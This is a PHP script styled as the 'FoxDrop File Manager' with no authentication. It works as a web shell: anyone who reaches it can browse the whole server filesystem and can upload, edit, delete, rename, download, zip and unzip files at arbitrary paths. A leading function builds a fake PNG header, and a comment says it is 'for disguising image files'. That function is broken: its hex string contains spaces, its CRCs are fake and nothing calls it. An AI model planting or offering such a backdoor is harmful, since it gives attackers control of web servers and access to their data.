<?php

// Fake PNG Header Generation (for disguising image files)
function generateFakePng() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $data = '89 50 4E 47 0D 0A 1A 0A'; // PNG signature
    $data .= '00 00 00 0D 49 48 44 52'; // IHDR chunk (header)
    $data .= '00 00 01 00 00 00 01 00'; // 1x1 image dimensions
    $data .= '08 02 00 00 00';          // Color type, compression, filter, interlace
    $data .= '00 00 00 00';             // CRC
    $data .= '00 00 00 00';             // Empty chunk
    $data .= '74 45 58 74 64 75 53 65'; // tEXt chunk signature
    $data .= '00 00 00 00';             // Text chunk data
    $data .= '75 73 65 72 2D 61 67 65'; // Random User-Agent
    $data .= '6E 74';                   // End of tEXt chunk
    
    // Fake corruption chunk (cORR)
    $data .= '63 4F 52 52 00 00 00 01'; // cORR signature
    $data .= '00 00 00 00';             // Fake corruption data
    $data .= '49 45 4E 44 AE 42 60 82'; // End of PNG

    return hex2bin($data);
}

$path = isset($_GET['go']) ? $_GET['go'] : getcwd();
$path = realpath($path);
$sort = $_GET['sort'] ?? 'name';
$order = $_GET['order'] ?? 'asc';

if (!$path || !is_dir($path)) $path = getcwd();
chdir($path);

// === Actions
if (isset($_FILES['upload_file'])) {
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $path . '/' . $_FILES['upload_file']['name']);
    $_SESSION['message'] = "File uploaded successfully!";
}
if (isset($_POST['newfile'])) {
    file_put_contents($path . '/' . $_POST['newfile'], '');
}
if (isset($_POST['newfolder'])) {
    mkdir($path . '/' . $_POST['newfolder']);
}
if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if ($target && strpos($target, $path) === 0) {
        is_dir($target) ? rmdir($target) : unlink($target);
    }
}
if (isset($_POST['edit_file']) && isset($_POST['new_content'])) {
    file_put_contents($_POST['edit_file'], $_POST['new_content']);
    $_SESSION['message'] = "File edited successfully!";
}
if (isset($_GET['download'])) {
    $file = realpath($path . '/' . $_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}
if (isset($_GET['zip']) && $_GET['zip'] === 'true') {
    $file = realpath($path . '/' . $_GET['file']);
    if (is_file($file)) {
        $zip = new ZipArchive();
        $zipPath = $file . '.zip';
        if ($zip->open($zipPath, ZipArchive::CREATE) === TRUE) {
            $zip->addFile($file, basename($file));
            $zip->close();
        }
    }
}
if (isset($_GET['unzip']) && $_GET['unzip'] === 'true') {
    $file = realpath($path . '/' . $_GET['file']);
    if (is_file($file) && pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($file)) {
            $zip->extractTo($path);
            $zip->close();
        }
    }
}
if (isset($_GET['rename']) && isset($_GET['to'])) {
    $old = realpath($path . '/' . $_GET['rename']);
    $new = $path . '/' . $_GET['to'];
    if ($old && strpos($old, $path) === 0) {
        rename($old, $new);
    }
}

// === UI Output
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>FoxDrop File Manager</title>
<style>
body { font-family: sans-serif; font-size:14px; background:#f9f9f9; }
a { text-decoration: none; color: #007bff; }
a:hover { text-decoration: underline; }
table { border-collapse: collapse; width: 100%; }
th, td { padding: 6px 10px; border-bottom: 1px solid #ccc; text-align: left; }
.actions a { margin-right: 10px; }
.topbar { background:#fff; padding:10px; border-bottom:1px solid #ccc; display:flex; align-items:center; justify-content: space-between; }
.path { flex-grow: 1; }
.controls form { display:inline; margin-left:10px; }
.controls input[type='text'] { padding:4px; }
</style>
</head><body>";

if (isset($_SESSION['message'])) {
    echo "<div style='background-color: #d4edda; padding: 10px; margin: 10px 0; border-radius: 5px; color: #155724;'>
            " . $_SESSION['message'] . "
          </div>";
    unset($_SESSION['message']);  // Clear the message after displaying
}

echo "<div class='topbar'><div class='path'><strong>FoxDrop File Manager</strong><br>Path: ";

$parts = explode(DIRECTORY_SEPARATOR, $path);
$build = '';
echo "<a href='?go=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a>";
foreach ($parts as $p) {
    if ($p === '') continue;
    $build .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?go=" . urlencode($build) . "'>" . htmlspecialchars($p) . "</a>/";
}
echo "</div>";

echo "<div class='controls'>
<form method='post' enctype='multipart/form-data'><input type='file' name='upload_file' onchange='this.form.submit()'></form>
<form method='post'><input type='text' name='newfile' placeholder='New File'><button>Create File</button></form>
<form method='post'><input type='text' name='newfolder' placeholder='New Folder'><button>Create Folder</button></form>
</div></div><hr>";

$files = scandir($path);
$items = [];
foreach ($files as $f) {
    if ($f === '.') continue;
    $items[] = $f;
}

usort($items, function($a, $b) use ($sort, $order, $path) {
    $valA = ($sort === 'size') ? filesize("$path/$a") : $a;
    $valB = ($sort === 'size') ? filesize("$path/$b") : $b;
    return $order === 'asc' ? $valA <=> $valB : $valB <=> $valA;
});

echo "<table><tr><th><a href='?go=" . urlencode($path) . "&sort=name&order=" . ($order === 'asc' ? 'desc' : 'asc') . "'>Name</a></th>
<th><a href='?go=" . urlencode($path) . "&sort=size&order=" . ($order === 'asc' ? 'desc' : 'asc') . "'>Size</a></th>
<th>Permissions</th><th>Actions</th></tr>";

foreach ($items as $file) {
    $full = $path . '/' . $file;
    $isDir = is_dir($full);
    echo "<tr><td>" . ($isDir ? "📁" : "📄") . " ";
    echo $isDir ? "<a href='?go=" . urlencode($full) . "'>" . htmlspecialchars($file) . "</a>" : htmlspecialchars($file);
    echo "</td><td>" . ($isDir ? "-" : filesize($full)) . "</td><td style='color: " . (is_writable($full) ? 'blue' : 'green') . ";'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td><td class='actions'>";
    echo !$isDir ? "<a href='?go=" . urlencode($path) . "&edit=" . urlencode($file) . "'>Edit</a> | " : "";
    echo "<a href='?go=" . urlencode($path) . "&download=" . urlencode($file) . "'>Download</a> | ";
    echo "<a href='#' onclick='renameFile(\"" . htmlspecialchars($file) . "\")'>Rename</a> | ";
    echo "<a href='?go=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete " . addslashes($file) . "?\")'>Delete</a>";
    if (!$isDir && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'zip') {
        echo " | <a href='?go=" . urlencode($path) . "&unzip=true&file=" . urlencode($file) . "'>Unzip</a>";
    } elseif (!$isDir) {
        echo " | <a href='?go=" . urlencode($path) . "&zip=true&file=" . urlencode($file) . "'>ZIP</a>";
    }
    echo "</td></tr>";
}
echo "</table>";

// === Edit Modal
if (isset($_GET['edit'])) {
    $editFile = realpath($path . '/' . $_GET['edit']);
    if (is_file($editFile)) {
        $content = htmlspecialchars(file_get_contents($editFile));
        echo "<div id='editModal' style='
        position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
        width:80%; max-width:800px; height:80%; max-height:600px;
        background:#fff; border:2px solid #000; padding:10px; z-index:1000; box-shadow:0 0 15px rgba(0,0,0,0.4);'>
        <form method='post' style='height:100%; display:flex; flex-direction:column;'>
        <input type='hidden' name='edit_file' value='" . htmlspecialchars($editFile) . "'>
        <textarea name='new_content' style='flex:1; width:100%; resize:none; font-family:monospace;'>$content</textarea>
        <div style='text-align:right; margin-top:10px;'>
        <button type='submit'>Save</button>
        <button type='button' onclick='window.location.href=\"?go=" . urlencode($path) . "\"'>Cancel</button>
        </div></form></div>";
    }
}

echo "<script>
function renameFile(oldName) {
    var newName = prompt('Rename to:', oldName);
    if (newName && newName !== oldName) {
        window.location.href = '?go=" . urlencode($path) . "&rename=' + encodeURIComponent(oldName) + '&to=' + encodeURIComponent(newName);
    }
}
</script>";

echo "</body></html>";
?>
